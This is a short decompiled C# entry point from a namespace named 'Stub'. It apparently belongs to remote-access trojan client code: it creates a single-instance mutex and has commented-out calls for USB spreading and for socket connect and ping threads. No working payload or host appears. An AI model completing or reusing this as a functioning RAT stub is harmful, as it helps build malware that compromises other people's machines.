using System;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace Stub
{
	// Token: 0x02000008 RID: 8
	public class Main
	{
		// Token: 0x06000014 RID: 20 RVA: 0x00002268 File Offset: 0x00000468
		[STAThread]
		[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
		public static void Main()
		{
			Thread.Sleep(1000);
			if (!Helper.CreateMutex())
			{
				ProjectData.EndApp();
			}
			//Settings.USBS.Start();
			//Settings.dTimer2.Elapsed += Helper.tickees;
			//Thread thread = new Thread(new ThreadStart(ClientSocket.BeginConnect));
			//thread.Start();
			//Thread thread2 = new Thread(new ThreadStart(ClientSocket.Ping));
			//thread2.Start();
		}
	}
}
